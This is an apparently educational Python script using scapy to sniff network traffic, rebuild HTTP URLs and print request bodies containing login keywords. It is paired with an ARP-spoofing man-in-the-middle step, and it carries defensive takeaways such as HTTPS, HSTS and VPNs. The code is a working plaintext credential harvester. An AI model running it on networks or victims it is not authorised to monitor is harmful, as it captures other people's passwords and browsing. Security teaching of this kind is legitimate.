#!/usr/bin/env python3
"""
packet_sniffer.py — read interesting data out of traffic flowing past you.

================================ THE LESSON ================================

WHERE THIS SITS
    Once arp_spoofer.py has made you the man in the middle, the target's
    traffic physically passes through your machine. A sniffer simply *reads*
    that traffic. (You can also sniff your own machine's traffic directly,
    which is the safe way to practice this one.)

THE WEAKNESS: PLAINTEXT PROTOCOLS
    Many old protocols send data with NO encryption:
        - HTTP (not HTTPS): URLs and form fields travel in clear text.
        - FTP, Telnet, old POP3/IMAP: usernames and passwords in clear text.
    If you can see the bytes on the wire, you can read them. This program
    watches HTTP requests and pulls out (a) the URL being visited and (b) any
    field that looks like a login (username/password/email...).

    This is THE reason the web moved to HTTPS. The lesson isn't "how to steal
    passwords" — it's "see for yourself why unencrypted traffic is indefensible
    and why TLS everywhere mattered so much."

HOW IT WORKS
    scapy's sniff() hands every captured packet to a callback. We dig through
    the layers:
        packet[HTTPRequest]            -> it's an HTTP request
        packet[HTTPRequest].Host/.Path -> reconstruct the URL
        packet[Raw].load               -> the request BODY (where form posts
                                          carry username=...&password=...)
    We scan the body for keywords and print anything suspicious.

=============================== THE PYTHON ================================
    * scapy layered access — `Layer in packet` to test, `packet[Layer]` to read.
    * scapy HTTP module — scapy.layers.http gives us HTTPRequest parsing.
    * string manipulation — decode bytes, search for keywords, slice out URLs.
    * callbacks (prn=) — passing a FUNCTION to sniff() so it runs per packet.

=========================== DEFENSIVE TAKEAWAY ===========================
    * Use HTTPS/TLS everywhere — a sniffer on a TLS stream sees only encrypted
      bytes. Enforce HSTS so browsers refuse to downgrade to HTTP.
    * Use a VPN on untrusted networks (coffee-shop Wi-Fi) so the local segment
      sees only your encrypted tunnel.
    * Retire plaintext protocols: SFTP/FTPS over FTP, SSH over Telnet,
      IMAPS/POP3S over their plaintext versions.
    * On a network you run, switched networks + port security + DAI (see tool
      #3/#8) limit who can even get into a position to sniff.

USAGE (inside your lab, as root). Sniff an interface you're authorized on:
    sudo python3 packet_sniffer.py -i eth0

Install the HTTP layer support if needed:
    pip3 install scapy
===========================================================================
"""

import argparse

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import sniff, Raw
from scapy.layers.http import HTTPRequest  # scapy's HTTP request parser

# Keywords that commonly appear in login form fields. We keep them lowercase
# and compare against a lowercased body so matching is case-insensitive.
LOGIN_KEYWORDS = ["username", "user", "login", "email", "pass", "password", "pwd"]


def get_arguments():
    parser = argparse.ArgumentParser(description="Sniff HTTP URLs and possible credentials (lab use only).")
    parser.add_argument("-i", "--interface", dest="interface", required=True,
                        help="Interface to sniff, e.g. eth0")
    return parser.parse_args()


def get_url(packet):
    """Reconstruct the requested URL from an HTTP request packet.

    .Host and .Path come out of scapy as bytes (e.g. b"example.com"), so we
    decode them to normal strings and glue them together.
    """
    host = packet[HTTPRequest].Host.decode(errors="ignore")
    path = packet[HTTPRequest].Path.decode(errors="ignore")
    return host + path


def get_login_info(packet):
    """If the packet has a body containing a login-like keyword, return it.

    Raw is scapy's name for the payload bytes after the known headers — for a
    POSTed form that's where "username=alice&password=secret" lives. We only
    return the body when it mentions one of our keywords, so we don't print
    every random byte.
    """
    if not packet.haslayer(Raw):
        return None
    body = packet[Raw].load.decode(errors="ignore")
    lowered = body.lower()
    if any(keyword in lowered for keyword in LOGIN_KEYWORDS):
        return body
    return None


def process_packet(packet):
    """Callback run by sniff() for every captured packet."""
    if not packet.haslayer(HTTPRequest):
        return  # not an HTTP request; ignore it

    url = get_url(packet)
    print(f"[+] HTTP request >> {url}")

    login = get_login_info(packet)
    if login:
        print("\n\n[!!] Possible credentials in request body:")
        print("     " + login + "\n\n")


def main():
    args = get_arguments()
    print(f"[i] Sniffing on {args.interface}. Ctrl+C to stop.\n")
    # store=False: don't keep packets in memory (we handle them as they arrive).
    # prn=process_packet: call our function on each one.
    sniff(iface=args.interface, store=False, prn=process_packet)


if __name__ == "__main__":
    main()
